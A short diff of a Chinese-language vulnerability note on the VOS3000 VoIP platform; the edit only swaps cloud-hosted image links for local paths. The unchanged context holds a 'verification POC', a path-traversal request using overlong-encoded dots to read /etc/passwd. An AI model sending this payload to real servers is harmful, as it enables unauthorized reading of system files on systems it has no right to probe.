@@ -20,7 +20,7 @@ app="VOS-VOS3000"
 
 登录页面
 
-![image-20220525144202606](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251442673.png)
+![image-20220525144202606](./images/202205251442673.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="VOS-VOS3000"
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251443278.png)
+![](./images/202205251443278.png)
